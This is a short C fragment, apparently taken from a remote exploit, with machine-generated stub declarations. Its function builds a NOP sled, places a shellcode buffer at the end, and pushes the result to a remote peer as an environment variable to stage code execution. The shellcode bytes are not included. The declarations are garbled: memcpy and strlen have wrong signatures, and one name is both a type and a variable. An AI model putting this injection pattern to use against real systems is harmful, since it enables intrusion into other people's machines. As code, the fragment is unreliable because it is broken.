
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int storebuf ;


 int memcpy (int,int ,unsigned char*) ;
 int memset (unsigned char*,char,int) ;
 int shellcode ;
 int sprintf (unsigned char*,char*,int) ;
 unsigned char* strlen (int ) ;
 int walk ;
 int x86_nop (unsigned char*,int,char*,int) ;
 int xp_setenv (int,unsigned char*,unsigned char*) ;

void
xp_pop (int fd)
{
        unsigned char var[16];
        unsigned char storebuf[496];
        sprintf (var, "%06x", walk);




        x86_nop (storebuf, sizeof (storebuf), "\x00\x01\x02\x03\xff", 5);
        memcpy (storebuf + sizeof (storebuf) - strlen (shellcode) - 1,
                shellcode, strlen (shellcode));

        storebuf[sizeof (storebuf) - 1] = '\0';

        xp_setenv (fd, var, storebuf);
}
